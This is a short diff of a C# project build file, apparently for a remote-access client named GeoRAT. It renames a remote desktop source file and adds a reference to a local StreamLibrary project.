@@ -46,7 +46,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="CommandHandlers\CommandHandler.cs" />
-    <Compile Include="Core\RemoteDesktopHandler.cs" />
+    <Compile Include="Core\RemoteDesktopService.cs" />
     <Compile Include="Network\ClientNetwork.cs" />
     <Compile Include="Network\DataReader.cs" />
     <Compile Include="Network\RemoteDesktop\DesktopSharing.cs" />
@@ -60,6 +60,10 @@
     <None Include="App.config" />
   </ItemGroup>
   <ItemGroup>
+    <ProjectReference Include="..\..\..\..\Desktop\StreamLibrary-master\StreamLibrary\StreamLibrary.csproj">
+      <Project>{9417f922-6ea9-4811-bb98-8d2a875396c7}</Project>
+      <Name>StreamLibrary</Name>
+    </ProjectReference>
     <ProjectReference Include="..\GeoRAT.Core\GeoRAT.Core.csproj">
       <Project>{7d239417-861c-48e7-bc0e-2bb8631fc0bc}</Project>
       <Name>GeoRAT.Core</Name>
